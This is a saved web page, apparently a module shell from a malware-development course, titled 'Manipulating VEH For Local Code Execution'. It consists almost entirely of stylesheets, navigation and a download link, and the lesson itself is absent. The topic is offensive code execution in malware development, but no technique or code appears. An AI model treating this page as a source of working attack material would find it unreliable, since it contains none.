f242"}.fa-battery-1:before,.fa-battery-quarter:before{content:"\f243"}.fa-battery-0:before,.fa-battery-empty:before{content:"\f244"}.fa-mouse-pointer:before{content:"\f245"}.fa-i-cursor:before{content:"\f246"}.fa-object-group:before{content:"\f247"}.fa-object-ungroup:before{content:"\f248"}.fa-sticky-note:before{content:"\f249"}.fa-sticky-note-o:before{content:"\f24a"}.fa-cc-jcb:before{content:"\f24b"}.fa-cc-diners-club:before{content:"\f24c"}.fa-clone:before{content:"\f24d"}.fa-balance-scale:before{content:"\f24e"}.fa-hourglass-o:before{content:"\f250"}.fa-hourglass-1:before,.fa-hourglass-start:before{content:"\f251"}.fa-hourglass-2:before,.fa-hourglass-half:before{content:"\f252"}.fa-hourglass-3:before,.fa-hourglass-end:before{content:"\f253"}.fa-hourglass:before{content:"\f254"}.fa-hand-grab-o:before,.fa-hand-rock-o:before{content:"\f255"}.fa-hand-stop-o:before,.fa-hand-paper-o:before{content:"\f256"}.fa-hand-scissors-o:before{content:"\f257"}.fa-hand-lizard-o:before{content:"\f258"}.fa-hand-spock-o:before{content:"\f259"}.fa-hand-pointer-o:before{content:"\f25a"}.fa-hand-peace-o:before{content:"\f25b"}.fa-trademark:before{content:"\f25c"}.fa-registered:before{content:"\f25d"}.fa-creative-commons:before{content:"\f25e"}.fa-gg:before{content:"\f260"}.fa-gg-circle:before{content:"\f261"}.fa-tripadvisor:before{content:"\f262"}.fa-odnoklassniki:before{content:"\f263"}.fa-odnoklassniki-square:before{content:"\f264"}.fa-get-pocket:before{content:"\f265"}.fa-wikipedia-w:before{content:"\f266"}.fa-safari:before{content:"\f267"}.fa-chrome:before{content:"\f268"}.fa-firefox:before{content:"\f269"}.fa-opera:before{content:"\f26a"}.fa-internet-explorer:before{content:"\f26b"}.fa-tv:before,.fa-television:before{content:"\f26c"}.fa-contao:before{content:"\f26d"}.fa-500px:before{content:"\f26e"}.fa-amazon:before{content:"\f270"}.fa-calendar-plus-o:before{content:"\f271"}.fa-calendar-minus-o:before{content:"\f272"}.fa-calendar-times-o:before{content:"\f273"}.fa-calendar-check-o:before{content:"\f274"}.fa-industry:before{content:"\f275"}.fa-map-pin:before{content:"\f276"}.fa-map-signs:before{content:"\f277"}.fa-map-o:before{content:"\f278"}.fa-map:before{content:"\f279"}.fa-commenting:before{content:"\f27a"}.fa-commenting-o:before{content:"\f27b"}.fa-houzz:before{content:"\f27c"}.fa-vimeo:before{content:"\f27d"}.fa-black-tie:before{content:"\f27e"}.fa-fonticons:before{content:"\f280"}.fa-reddit-alien:before{content:"\f281"}.fa-edge:before{content:"\f282"}.fa-credit-card-alt:before{content:"\f283"}.fa-codiepie:before{content:"\f284"}.fa-modx:before{content:"\f285"}.fa-fort-awesome:before{content:"\f286"}.fa-usb:before{content:"\f287"}.fa-product-hunt:before{content:"\f288"}.fa-mixcloud:before{content:"\f289"}.fa-scribd:before{content:"\f28a"}.fa-pause-circle:before{content:"\f28b"}.fa-pause-circle-o:before{content:"\f28c"}.fa-stop-circle:before{content:"\f28d"}.fa-stop-circle-o:before{content:"\f28e"}.fa-shopping-bag:before{content:"\f290"}.fa-shopping-basket:before{content:"\f291"}.fa-hashtag:before{content:"\f292"}.fa-bluetooth:before{content:"\f293"}.fa-bluetooth-b:before{content:"\f294"}.fa-percent:before{content:"\f295"}.fa-gitlab:before{content:"\f296"}.fa-wpbeginner:before{content:"\f297"}.fa-wpforms:before{content:"\f298"}.fa-envira:before{content:"\f299"}.fa-universal-access:before{content:"\f29a"}.fa-wheelchair-alt:before{content:"\f29b"}.fa-question-circle-o:before{content:"\f29c"}.fa-blind:before{content:"\f29d"}.fa-audio-description:before{content:"\f29e"}.fa-volume-control-phone:before{content:"\f2a0"}.fa-braille:before{content:"\f2a1"}.fa-assistive-listening-systems:before{content:"\f2a2"}.fa-asl-interpreting:before,.fa-american-sign-language-interpreting:before{content:"\f2a3"}.fa-deafness:before,.fa-hard-of-hearing:before,.fa-deaf:before{content:"\f2a4"}.fa-glide:before{content:"\f2a5"}.fa-glide-g:before{content:"\f2a6"}.fa-signing:before,.fa-sign-language:before{content:"\f2a7"}.fa-low-vision:before{content:"\f2a8"}.fa-viadeo:before{content:"\f2a9"}.fa-viadeo-square:before{content:"\f2aa"}.fa-snapchat:before{content:"\f2ab"}.fa-snapchat-ghost:before{content:"\f2ac"}.fa-snapchat-square:before{content:"\f2ad"}.fa-pied-piper:before{content:"\f2ae"}.fa-first-order:before{content:"\f2b0"}.fa-yoast:before{content:"\f2b1"}.fa-themeisle:before{content:"\f2b2"}.fa-google-plus-circle:before,.fa-google-plus-official:before{content:"\f2b3"}.fa-fa:before,.fa-font-awesome:before{content:"\f2b4"}.fa-handshake-o:before{content:"\f2b5"}.fa-envelope-open:before{content:"\f2b6"}.fa-envelope-open-o:before{content:"\f2b7"}.fa-linode:before{content:"\f2b8"}.fa-address-book:before{content:"\f2b9"}.fa-address-book-o:before{content:"\f2ba"}.fa-vcard:before,.fa-address-card:before{content:"\f2bb"}.fa-vcard-o:before,.fa-address-card-o:before{content:"\f2bc"}.fa-user-circle:before{content:"\f2bd"}.fa-user-circle-o:before{content:"\f2be"}.fa-user-o:before{content:"\f2c0"}.fa-id-badge:before{content:"\f2c1"}.fa-drivers-license:before,.fa-id-card:before{content:"\f2c2"}.fa-drivers-license-o:before,.fa-id-card-o:before{content:"\f2c3"}.fa-quora:before{content:"\f2c4"}.fa-free-code-camp:before{content:"\f2c5"}.fa-telegram:before{content:"\f2c6"}.fa-thermometer-4:before,.fa-thermometer:before,.fa-thermometer-full:before{content:"\f2c7"}.fa-thermometer-3:before,.fa-thermometer-three-quarters:before{content:"\f2c8"}.fa-thermometer-2:before,.fa-thermometer-half:before{content:"\f2c9"}.fa-thermometer-1:before,.fa-thermometer-quarter:before{content:"\f2ca"}.fa-thermometer-0:before,.fa-thermometer-empty:before{content:"\f2cb"}.fa-shower:before{content:"\f2cc"}.fa-bathtub:before,.fa-s15:before,.fa-bath:before{content:"\f2cd"}.fa-podcast:before{content:"\f2ce"}.fa-window-maximize:before{content:"\f2d0"}.fa-window-minimize:before{content:"\f2d1"}.fa-window-restore:before{content:"\f2d2"}.fa-times-rectangle:before,.fa-window-close:before{content:"\f2d3"}.fa-times-rectangle-o:before,.fa-window-close-o:before{content:"\f2d4"}.fa-bandcamp:before{content:"\f2d5"}.fa-grav:before{content:"\f2d6"}.fa-etsy:before{content:"\f2d7"}.fa-imdb:before{content:"\f2d8"}.fa-ravelry:before{content:"\f2d9"}.fa-eercast:before{content:"\f2da"}.fa-microchip:before{content:"\f2db"}.fa-snowflake-o:before{content:"\f2dc"}.fa-superpowers:before{content:"\f2dd"}.fa-wpexplorer:before{content:"\f2de"}.fa-meetup:before{content:"\f2e0"}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0, 0, 0, 0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}</style><style class="darkreader darkreader--sync" media="screen"></style>
        <!-- google fonts -->
        <link rel="preconnect" href="https://fonts.gstatic.com/">
        <link href="69_files/css2.css" rel="stylesheet">
        <link href="69_files/css2_002.css" rel="stylesheet">
        <title>Manipulating VEH For Local Code Execution </title>
        <!-- Custom css files, order matters -->
        <link rel="preload" as="style" href="69_files/app-kkVsMfHl.css"><link rel="stylesheet" href="69_files/app-kkVsMfHl.css"><style class="darkreader darkreader--sync" media="screen"></style><link href="69_files/prism-coldark-dark.css" rel="stylesheet"><style class="darkreader darkreader--sync" media="screen"></style>

<link rel="stylesheet" href="69_files/viewer.css"><style class="darkreader darkreader--sync" media="screen"></style>
    <meta name="darkreader" content="086fa4d6a04944a89a6111bef95e8f1a"><style class="darkreader darkreader--override" media="screen">.vimvixen-hint {
    background-color: var(--darkreader-background-ffd76e, #684b00) !important;
    border-color: var(--darkreader-background-c59d00, #9e7e00) !important;
    color: var(--darkreader-text-302505, #d7d4cf) !important;
}
#vimvixen-console-frame {
    color-scheme: light !important;
}
::placeholder {
    opacity: 0.5 !important;
}
#edge-translate-panel-body,
.MuiTypography-body1,
.nfe-quote-text {
    color: var(--darkreader-neutral-text) !important;
}
gr-main-header {
    background-color: var(--darkreader-background-add8e6, #1b4958) !important;
}
.tou-z65h9k,
.tou-mignzq,
.tou-1b6i2ox,
.tou-lnqlqk {
    background-color: var(--darkreader-neutral-background) !important;
}
.tou-75mvi {
    background-color: var(--darkreader-background-cfecf5, #0f3a47) !important;
}
.tou-ta9e87,
.tou-1w3fhi0,
.tou-1b8t2us,
.tou-py7lfi,
.tou-1lpmd9d,
.tou-1frrtv8,
.tou-17ezmgn {
    background-color: var(--darkreader-background-f5f5f5, #1e2021) !important;
}
.tou-uknfeu {
    background-color: var(--darkreader-background-faedda, #432c09) !important;
}
.tou-6i3zyv {
    background-color: var(--darkreader-background-85c3d8, #245d70) !important;
}
div.mermaid-viewer-control-panel .btn {
    background-color: var(--darkreader-neutral-background);
    fill: var(--darkreader-neutral-text);
}
svg g rect.er {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.entityBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxOdd {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.er.attributeBoxEven {
    fill: var(--darkreader-selection-background);
    fill-opacity: 0.8 !important;
}
svg rect.er.relationshipLabelBox {
    fill: var(--darkreader-neutral-background) !important;
}
svg g g.nodes rect,
svg g g.nodes polygon {
    fill: var(--darkreader-neutral-background) !important;
}
svg g rect.task {
    fill: var(--darkreader-selection-background) !important;
}
svg line.messageLine0,
svg line.messageLine1 {
    stroke: var(--darkreader-neutral-text) !important;
}
div.mermaid .actor {
    fill: var(--darkreader-neutral-background) !important;
}
mitid-authenticators-code-app > .code-app-container {
    background-color: white !important;
    padding-top: 1rem;
}
iframe#unpaywall[src$="unpaywall.html"] {
    color-scheme: light !important;
}
select {
    --darkreader-bg--form-control-background-color: rgba(22, 22, 22, 0) !important;
}
select * {
    background-color: var(--darkreader-neutral-background) !important;
}
body#tumblr {
    --darkreader-bg--secondary-accent: 31, 32, 34 !important;
    --darkreader-bg--white: 23, 23, 23 !important;
    --darkreader-text--black: 228, 224, 218 !important;
}
:host {
    --d2l-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-button-icon-background-color-hover: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-color-ferrite: var(--darkreader-neutral-text) !important;
    --d2l-color-sylvite: var(--darkreader-bg--d2l-color-sylvite) !important;
    --d2l-dropdown-background-color: var(--darkreader-neutral-background) !important;
    --d2l-dropdown-border-color: var(--darkreader-border--d2l-color-mica) !important;
    --d2l-input-backgroud-color: var(--darkreader-neutral-background) !important;
    --d2l-menu-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
    --d2l-tooltip-background-color: var(--darkreader-neutral-background) !important;
    --d2l-tooltip-border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
:host([_floating]) .d2l-floating-buttons-container {
    background-color: var(--darkreader-neutral-background) !important;
    border-top-color: var(--darkreader-border--d2l-color-mica) !important;
    opacity: 0.88 !important;
}
d2l-card {
    background: var(--darkreader-neutral-background) !important;
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
d2l-dropdown-content > div,
d2l-menu-item {
    background-color: var(--darkreader-neutral-background) !important;
    border-radius: 10px !important;
}
d2l-empty-state-simple {
    border-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-button-filter > ul > li > a.vui-button {
    border-color: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-label-text:has(.d2l-button-subtle-content):hover,
.d2l-label-text:has(.d2l-button-subtle-content):focus,
.d2l-label-text:has(.d2l-button-subtle-content):active {
    background-color: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-navigation-centerer {
    color: inherit !important;
}
.d2l-tabs-layout {
    border-color: var(--darkreader-border--d2l-color-gypsum) !important;
}
.d2l-input,
.d2l-calendar-date,
.d2l-htmleditor-container {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-collapsible-panel {
    border: 1px solid var(--darkreader-border--d2l-color-mica) !important;
    border-radius: 0.4rem !important;
}
.d2l-collapsible-panel-divider {
    border-bottom: 1px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-w2d-flex {
    border-bottom: 2px solid var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-collapsible-panel scrolled,
.d2l-collapsible-panel-header,
.d2l-w2d-collection-fixed {
    background-color: var(--darkreader-neutral-background) !important;
}
.d2l-loading-spinner-bg {
    fill: var(--darkreader-bg--d2l-color-gypsum) !important;
}
.d2l-loading-spinner-bg-stroke {
    stroke: var(--darkreader-border--d2l-color-mica) !important;
}
.d2l-loading-spinner-wrapper svg path,
.d2l-loading-spinner-wrapper svg circle {
    fill: var(--darkreader-neutral-background) !important;
}
embed[type="application/pdf"] { filter: invert(100%) contrast(90%); }</style><style>.base-arrow-GfAHTK {
  background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABsAAAAyCAYAAACtd6CrAAAACXBIWXMAAC4jAAAuIwF4pT92AAAC9ElEQVR4nL2YSWtUQRSFS23nhRsXgmsFE/+AmwRFURQnRMURdSMSp2iCnXQwA3ZMSIKJRMRNHFDEefaXqP/An2Ack/Yc320pz+skPdx44TSv3ynq49Z7r+pWZerr1qwLIdyFVkA3oPYPHz8VwixEBroDrbL/WWjZ2vq6ptkAErZS7p2CJgE84w0k7BZ0Qe43QQUAz3oCCWuFlkNHxTsNTQDY7AXMoCMO2Qlcz4GOiH8OIqjZBcYfAJnBcVzOgw5Km/PwJtCmxQUWATmUzPCAtLsIr4A2rS4wAc6F9kvbFssw6wIz4C90ejgkGe4T+5Jl2OYCi4CHQvIM94idhTeJNjkXWATks3sE7Ra73TLscIEZ8Cc65bN7DO0SO2fPsNMFJsAn0A6xL9uQdrvADPgDne7F5VNou9hdNqQ9LjABPoO2id1tQ5p3gRnwOzrl2/kc2ir2Fcuw1wUmwBfQFrHzlmG/C8yA39ApP4eX0Gax+ww46AIT4Ctok9gDNqRDLjADfkWnO3H5Gtoo9qBlOOwCE+AbaIPY1yzDEReYAcfRKb+/t9D6EkBmOOoCE+A7qDGyuHpchzfuBjPgF3TKD/491CDAq66wmcIVhqyWhmQYG8Ri0dTmBgNoSUjeyEaxCGL9OeYCi0D6JjJYd47yomYYQItDMovoN1YEjRT/1ASLQDp7MFri2aMmGECLQjLz67zIaNV5sWpYBNIZn5EtNeNXBQNoYUhWa13LGLmp1rKKYRFIV2lGx3SrdEUwgBaEpMLS+oPROVP9UTYsAmllxegqp7IqCwbQ/JBUxVozMnrKrRlnhEUgrYYZ+Uqq4WlhANF7GNJ1PqO30jp/SpiBHoT0DobRV80OpiTMQPdDem/G6K92b5aCAcT92L2Q3nUyBmvZdf4Di0C6n2YM1bqf/gsz0O2QPilgDHucFPyBAcTN+lhIn4EwuBbp6U/1MGggpE93GFxd3U53irCTJe7zKND13KoI+wytju7dhNxP5IqwY+E/HW7+BpJoVXj80aQPAAAAAElFTkSuQmCC);
  width: 16px;
  height: 16px;
  position: absolute;
  top: 16px;
  left: 16px;
  cursor: pointer;
  background-size: contain;
  background-repeat: no-repeat;
}
.base-navigation-tab-Ahvn3N {
  width: 24px;
  height: 24px;
  background-position: center;
  background-repeat: no-repeat;
  background-size: contain;
}
.base-navigation-label-vUENtU {
  font-family: 'Inter', sans-serif;
  font-size: 13px;
  line-height: 18px;
  color: rgba(0, 0, 0, 0.87);
}
.shoop-de-tooltip-rXf0XP {
  position: relative;
}
.shoop-de-tooltip__text-block-VXptk_ {
  height: 136px;
  background: #e35144;
  position: absolute;
  top: -148px;
  width: 302px;
  padding: 16px;
  border-radius: 8px;
  font-family: 'Inter', sans-serif;
  font-style: normal;
  font-size: 15px;
  line-height: 21px;
  font-weight: normal;
  letter-spacing: -0.24px;
  color: #FFF;
  display: flex;
  align-items: flex-end;
}
.shoop-de-tooltip__polygon-a7JmmB {
  position: absolute;
  width: 15px;
  height: 15px;
  top: -20px;
  left: 17px;
  border-radius: 2px;
  transform: rotate(45deg);
  background: #e35144;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><style>.shoop-de-serp-beA_vX {
  z-index: 999999999999;
  width: max-content;
  font-size: 15px;
  line-height: 21px;
  font-weight: bold;
  box-sizing: border-box;
  display: flex;
  flex-direction: column;
  cursor: pointer;
}
.shoop-de-serp-beA_vX:hover .shoop-de-serp__tooltip-jznGdA {
  opacity: 1;
}
.shoop-de-serp__logo-VNEyj1 {
  width: 30px;
  height: 20px;
  background: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZmlsbC1ydWxlPSJldmVub2RkIiBjbGlwLXJ1bGU9ImV2ZW5vZGQiIGQ9Ik0yOC42NTg4IDYuNjUwMjFDMjMuODkxIDYuNjUwMjEgMTkuODUyMyA5Ljc3MTY0IDE4LjQ3NDggMTQuMDgyNEMxNi41NjQ4IDEyLjI5OSAxNC4wMDA0IDExLjIwNzUgMTEuMTgxMSAxMS4yMDc1QzUuMjc3NSAxMS4yMDc1IDAuNDkxNzkgMTUuOTkzMiAwLjQ5MTc5IDIxLjg5NjhDMC40OTE3OSAyNy44MDA0IDUuMjc3NSAzMi41ODYxIDExLjE4MTEgMzIuNTg2MUMxNS45NDg5IDMyLjU4NjEgMTkuOTg3NiAyOS40NjQ2IDIxLjM2NTEgMjUuMTUzOEMyMy4yNzUgMjYuOTM3MyAyNS44Mzk0IDI4LjAyODggMjguNjU4OCAyOC4wMjg4QzM0LjU2MjQgMjguMDI4OCAzOS4zNDgxIDIzLjI0MzEgMzkuMzQ4MSAxNy4zMzk1QzM5LjM0ODEgMTEuNDM1OSAzNC41NjI0IDYuNjUwMjEgMjguNjU4OCA2LjY1MDIxWk0yOC42NTg4IDIyLjI5NTJDMjUuOTIxNyAyMi4yOTUyIDIzLjcwMzEgMjAuMDc2NiAyMy43MDMxIDE3LjMzOTVDMjMuNzAzMSAxNC42MDI0IDI1LjkyMTcgMTIuMzgzOCAyOC42NTg4IDEyLjM4MzhDMzEuMzk1OSAxMi4zODM4IDMzLjYxNDUgMTQuNjAyNCAzMy42MTQ1IDE3LjMzOTVDMzMuNjE0NSAyMC4wNzY2IDMxLjM5NTkgMjIuMjk1MiAyOC42NTg4IDIyLjI5NTJaTTExLjE4MTEgMjYuODUyNUM4LjQ0MzkzIDI2Ljg1MjUgNi4yMjUzNiAyNC42MzM5IDYuMjI1MzYgMjEuODk2OEM2LjIyNTM2IDE5LjE1OTYgOC40NDM5MyAxNi45NDExIDExLjE4MTEgMTYuOTQxMUMxMy45MTgyIDE2Ljk0MTEgMTYuMTM2OCAxOS4xNTk2IDE2LjEzNjggMjEuODk2OEMxNi4xMzY4IDI0LjYzMzkgMTMuOTE4MiAyNi44NTI1IDExLjE4MTEgMjYuODUyNVoiIGZpbGw9IiMxRDdCQ0UiLz4KPC9zdmc+Cg==) no-repeat;
  background-size: contain;
}
.shoop-de-serp__premium-ZDFq9y {
  background-image: url(data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTYiIGhlaWdodD0iMTYiIHZpZXdCb3g9IjAgMCAxNiAxNiIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTggMC42NjY2NTZDNy4wNjAyNyAwLjY2NjY1NiA2LjI4NTcxIDEuNDU3MzUgNi4yODU3MSAyLjQxNjY2QzYuMjg1NzEgMy4wNzI5MSA2LjY0NzMyIDMuNjQ5NCA3LjE3ODU3IDMuOTQ3OTFMNS41IDcuMzc0OTlMMi44NzUgNS40NjA5M0MzLjIxODc1IDUuMTM5NjQgMy40Mjg1NyA0LjY3NDc5IDMuNDI4NTcgNC4xNjY2NkMzLjQyODU3IDMuMjA3MzUgMi42NTQwMiAyLjQxNjY2IDEuNzE0MjkgMi40MTY2NkMwLjc3NDU1NCAyLjQxNjY2IDAgMy4yMDczNSAwIDQuMTY2NjZDMCA0Ljk1Mjc5IDAuNTI5MDE4IDUuNjA2NzYgMS4yMzIxNCA1LjgyNTUxTDIuMjg1NzEgMTEuNzVWMTQuNjY2N0gxMy43MTQzVjExLjc1TDE0Ljc2NzkgNS44MjU1MUMxNS40NzEgNS42MDY3NiAxNiA0Ljk1Mjc5IDE2IDQuMTY2NjZDMTYgMy4yMDczNSAxNS4yMjU0IDIuNDE2NjYgMTQuMjg1NyAyLjQxNjY2QzEzLjM0NiAyLjQxNjY2IDEyLjU3MTQgMy4yMDczNSAxMi41NzE0IDQuMTY2NjZDMTIuNTcxNCA0LjY3NDc5IDEyLjc4MTMgNS4xMzk2NCAxMy4xMjUgNS40NjA5M0wxMC41IDcuMzc0OTlMOC44MjE0MyAzLjk0NzkxQzkuMzUyNjggMy42NDk0IDkuNzE0MjkgMy4wNzI5MSA5LjcxNDI5IDIuNDE2NjZDOS43MTQyOSAxLjQ1NzM1IDguOTM5NzMgMC42NjY2NTYgOCAwLjY2NjY1NlpNOCAxLjgzMzMyQzguMzIxNDMgMS44MzMzMiA4LjU3MTQzIDIuMDg4NTMgOC41NzE0MyAyLjQxNjY2QzguNTcxNDMgMi43NDQ3OCA4LjMyMTQzIDIuOTk5OTkgOCAyLjk5OTk5QzcuNjc4NTcgMi45OTk5OSA3LjQyODU3IDIuNzQ0NzggNy40Mjg1NyAyLjQxNjY2QzcuNDI4NTcgMi4wODg1MyA3LjY3ODU3IDEuODMzMzIgOCAxLjgzMzMyWk0xLjcxNDI5IDMuNTgzMzJDMi4wMzU3MSAzLjU4MzMyIDIuMjg1NzEgMy44Mzg1MyAyLjI4NTcxIDQuMTY2NjZDMi4yODU3MSA0LjQ5NDc4IDIuMDM1NzEgNC43NDk5OSAxLjcxNDI5IDQuNzQ5OTlDMS4zOTI4NiA0Ljc0OTk5IDEuMTQyODYgNC40OTQ3OCAxLjE0Mjg2IDQuMTY2NjZDMS4xNDI4NiAzLjgzODUzIDEuMzkyODYgMy41ODMzMiAxLjcxNDI5IDMuNTgzMzJaTTE0LjI4NTcgMy41ODMzMkMxNC42MDcxIDMuNTgzMzIgMTQuODU3MSAzLjgzODUzIDE0Ljg1NzEgNC4xNjY2NkMxNC44NTcxIDQuNDk0NzggMTQuNjA3MSA0Ljc0OTk5IDE0LjI4NTcgNC43NDk5OUMxMy45NjQzIDQuNzQ5OTkgMTMuNzE0MyA0LjQ5NDc4IDEzLjcxNDMgNC4xNjY2NkMxMy43MTQzIDMuODM4NTMgMTMuOTY0MyAzLjU4MzMyIDE0LjI4NTcgMy41ODMzMlpNOCA0Ljg5NTgyTDkuNzY3ODYgOC41MDUyTDEwLjYyNSA4LjcyMzk1TDEzLjQ4MjEgNi42NDU4MkwxMi42Nzg2IDExLjE2NjdIMy4zMjE0M0wyLjUxNzg2IDYuNjQ1ODJMNS4zNzUgOC43MjM5NUw2LjIzMjE0IDguNTA1Mkw4IDQuODk1ODJaTTMuNDI4NTcgMTIuMzMzM0gxMi41NzE0VjEzLjVIMy40Mjg1N1YxMi4zMzMzWiIgZmlsbD0iIzYwNDVFMiIvPgo8L3N2Zz4K);
  width: 16px;
  height: 16px;
  margin-right: 10px;
}
.shoop-de-serp__description-pzXVxP {
  color: #1D7BCE;
  font-weight: 600;
}
.shoop-de-serp__container-HDQc_M {
  display: flex;
  width: 100%;
}
</style><style class="darkreader darkreader--sync" media="screen"></style><meta name="shoop-toolbar" version="3.2.17.2"></head>
    <body>
        <nav id="navbar" class="w-full px-2 sm:px-0 z-40
    bg-[#101926] backdrop-blur-md sticky backdrop-saturate-150 border-b border-gray-700/50
     hidden">

    <div class="container flex flex-wrap md:flex-nowrap justify-between mx-auto">
      <a data-target="_self" href="https://maldevacademy.com/" class="flex items-center">
        <div class="main-logo flex flex-row items-center block sm:block md:hidden lg:block">
            <img class="w-[100px] h-[60px]" src="69_files/maldev-navbar-logo.svg" alt="Logo">   
        </div>
      </a>
      <button data-collapse-toggle="navbar-default" id="navbar-phone-btn" type="button" class="inline-flex items-center p-2 ml-3 text-sm text-gray-500 rounded-lg md:hidden hover:bg-gray-100 focus:outline-none focus:ring-2 focus:ring-gray-200 dark:text-gray-400 dark:hover:bg-gray-700 dark:focus:ring-gray-600" aria-controls="navbar-default" aria-expanded="false">
        <span class="sr-only">Open main menu</span>
        <svg class="w-6 h-6" aria-hidden="true" fill="currentColor" viewBox="0 0 20 20" xmlns="http://www.w3.org/2000/svg" style="--darkreader-inline-fill: currentColor;" data-darkreader-inline-fill=""><path fill-rule="evenodd" d="M3 5a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 10a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1zM3 15a1 1 0 011-1h12a1 1 0 110 2H4a1 1 0 01-1-1z" clip-rule="evenodd"></path></svg>
      </button>
      <div class="hidden w-full md:block md:w-auto items-center" id="navbar-default">
        <ul class="flex flex-col items-center p-4 mt-4 rounded-lg border md:flex-row md:space-x-8 md:mt-0 md:text-sm md:font-medium md:border-0 dark:border-gray-900">
          <li>
            <a data-target="_self" href="https://maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Home</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/tools" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Public Tools</a>
          </li>

          <li>
            <a data-target="_self" href="https://maldevacademy.com/faq" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">FAQ</a>
          </li>

          <li>
            <a data-target="_self" target="_blank" href="https://search.maldevacademy.com/" class="block py-2 pr-4 pl-3 text-gray-400 md:p-0">Maldev Database</a>
          </li>
                              <div class="group relative">
            <button id="profileNavBar" onclick="toggleProfileDropdown()" class="flex items-center justify-between w-full py-2 pl-3 pr-4 rounded md:border-0 md:p-0 md:w-auto text-gray-400">
              Account
              <svg class="w-2.5 h-2.5 ml-2.5" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 10 6">
                <path stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="m1 1 4 4 4-4" style="--darkreader-inline-stroke: currentColor;" data-darkreader-inline-stroke=""></path>
              </svg>
            </button>
            <div id="profileDropdown" class="md:absolute hidden md:left-0 md:font-normal md:bg-white md:divide-y md:divide-gray-100 md:rounded-lg md:shadow md:w-44 md:dark:bg-gray-800 border-[1px] dark:border-gray-700 z-20">
              <ul class="py-2 text-sm text-gray-700 dark:text-gray-400">
                <li>
                  <a href="https://maldevacademy.com/profile" class="block px-4 py-2  hover:bg-gray-100 dark:hover:bg-gray-600 dark:hover:text-white" target="_blank">Profile</a>
                </li>
                <li>
                <form action="https://maldevacademy.com/logout" method="POST" class="">
                </form>
                </li>
              </ul>
            </div>
          </div>
                                        <li class="mt-4 md:mt-0">
            <a data-target="_self" href="https://maldevacademy.com/dashboard" class="text-white bg-blue-600/90 hover:bg-blue-500/80 border border-blue-400/40 shadow-md font-medium rounded-lg text-sm px-5 py-2.5 text-center md:mr-3 mr-0 transition-all duration-200 backdrop-blur-sm backdrop-saturate-150">
              Dashboard
            </a>
          </li>
                  </ul>
      </div>
    </div>
    
  </nav>        <template id="app-template">
  
  <div class="fixed bottom-4 right-5 bg-gray-900 text-white text-sm font-bold rounded-xl px-2 py-2 shadow-lg cursor-pointer z-20" onclick="window.scrollTo({ top: 0, behavior: 'smooth' });">
      <img src="69_files/module-up.svg" width="20px" alt="">
  </div>

  <div class="bg-[#101926] p-4">
      
      <div class="flex relative z-10">
    <input type="hidden" value="20973">
    <div class="md:flex-row flex-col flex md:items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 border-l border-t border-gray-600/60 pl-4 pt-2 pb-2 rounded-tl-xl">
        <div>
            Module 69 - Manipulating VEH For Local Code Execution 
        </div>
        <div class="ml-2 w-4 h-4 rounded-full shadow-inner bg-rose-500/90 ring-1 ring-rose-400/50"></div>

    </div>
    <div class="flex justify-end items-center w-1/2 bg-gray-700/70 backdrop-blur-md backdrop-saturate-150 pr-4 pt-2 pb-2 rounded-tr-xl border-t border-r border-gray-600/60">
        <div class="progress-container pr-4">
        <img src="69_file#.svg" onclick="toggleProgress()" id="progressToggle" width="20" alt="Progress Toggle" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="enlarge-container pr-4">
        <img src="69_files/enlarge.svg" onclick="toggleScreenWidth()" id="enlargeToggle" width="20" alt="Screen Width" class="hover:bg-gray-600 rounded-sm cursor-pointer">
        </div>

        <div class="objectives-container pr-4">
        <img src="69_files/objectives.svg" onclick="toggleObjectives()" id="objectivesToggle" width="20" alt="Objectives" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>

        <div class="toc-container pr-4">
        <img src="69_files/toc.svg" onclick="toggleToC()" id="tocToggle" width="20" alt="ToC" class="hover:bg-gray-600 rounded-sm cursor-pointer bg-gray-600">
        </div>

        <div class="terminal-container  pr-4 ">
        <img src="69_files/ide.svg" onclick="toggleIde()" id="terminalToggle" width="22" alt="Terminal" class="hover:bg-gray-600 rounded-sm cursor-pointer ">
        </div>
                                    <div class="dl-container">
                <a href="https://maldevacademy.com/new/download/file/Local-VEH-Manipulation" target="_blank">
                    <img src="69_files/dl.svg" class="hover:bg-gray-600 rounded-full cursor-pointer" width="20" alt="Download">
                </a>
                </div>
            
                            </div>
</div>
